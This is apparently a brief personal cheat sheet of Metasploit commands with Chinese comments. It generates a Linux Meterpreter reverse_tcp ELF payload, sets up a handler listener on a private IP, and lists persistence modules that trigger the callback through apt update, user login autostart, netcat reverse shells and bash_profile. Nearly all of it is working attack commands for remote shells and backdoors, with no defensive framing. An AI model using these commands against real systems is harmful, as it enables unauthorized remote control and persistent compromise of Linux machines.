```
msfvenom -p linux/x64/meterpreter/reverse_tcp  lhost=192.168.42.129 lport=9999 -f elf > 123

use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 192.168.42.129
set lport 9999
exploit -j

```



```
exploit/linux/local/apt_package_manager_persistence
apt update反向连接
set AllowNoCleanup true
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 192.168.42.129
set lport 4444
ls -tr
```

```
exploit/linux/local/autostart_persistence
有效负载将在用户登录时执行
cmd/unix/reverse_netcat
https://blog.csdn.net/COCO56/article/details/107628019
root本地登录生效
```

```
exploit/linux/local/bash_profile_persistence 
每当目标用户打开 Bash 终端时，执行触发器就会执行回调负载
```

